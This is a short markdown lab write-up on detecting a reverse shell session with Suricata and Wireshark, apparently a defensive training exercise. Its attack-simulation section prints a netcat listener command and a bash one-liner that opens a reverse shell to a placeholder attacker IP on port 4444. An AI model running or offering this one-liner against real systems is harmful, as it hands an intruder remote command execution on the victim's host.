# Reverse Shell Detection

## Overview

This case demonstrates how reverse shell activity can be detected and investigated using Suricata and Wireshark.

Reverse shells are commonly used by attackers after gaining access to a target system. Instead of waiting for inbound connections, the compromised host initiates a connection back to the attacker, providing remote command execution capabilities.

The objective of this exercise was to simulate a reverse shell session, monitor the network communication, and analyze the session using packet-level evidence.

---

## Scenario

A reverse shell connection was initiated from a target Linux host to an attacker-controlled system.

A Netcat listener was used to receive the incoming connection, while Wireshark and Suricata monitored the generated network activity.

---

## Lab Environment

Attacker System:

* Kali Linux
* Netcat Listener
* Suricata IDS
* Wireshark

Target System:

* Kali Linux
* Bash Reverse Shell

---

## Attack Simulation

A Netcat listener was started on the monitoring host:

```bash
nc -lvnp 4444
```

A reverse shell was initiated from the target host:

```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

Once connected, several commands were executed through the interactive shell.

---

## Detection Sources

### Wireshark

Wireshark was used to analyze the reverse shell communication and reconstruct the session.

Observed information included:

* Source IP Address
* Destination IP Address
* Communication Port
* Interactive Commands
* Session Data

### Suricata IDS

Suricata was used to observe network activity associated with the reverse shell connection.

---

## Findings

The following indicators were identified:

* Reverse shell connection
* Outbound connection from target host
* Interactive command execution
* TCP communication over Port 4444
* Session persistence through a single TCP stream

---

## Security Impact

Reverse shells may allow attackers to:

* Execute commands remotely
* Establish persistence
* Perform privilege escalation
* Conduct lateral movement
* Deploy additional payloads

---

## Outcome

The reverse shell activity was successfully generated and investigated.

Wireshark provided visibility into the communication channel and command execution activity, while Suricata supplied supporting monitoring evidence.

---
